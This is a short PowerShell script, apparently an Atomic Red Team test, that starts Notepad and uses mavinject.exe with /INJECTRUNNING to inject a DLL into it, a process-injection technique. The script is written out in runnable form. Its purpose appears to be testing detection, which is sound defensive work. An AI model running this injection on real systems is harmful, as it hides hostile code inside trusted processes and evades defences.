#Joshua O. Cabauatan
#Atomic Test #1 - Process Injection via mavinject.exe

$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
Stop-Process -processname notepad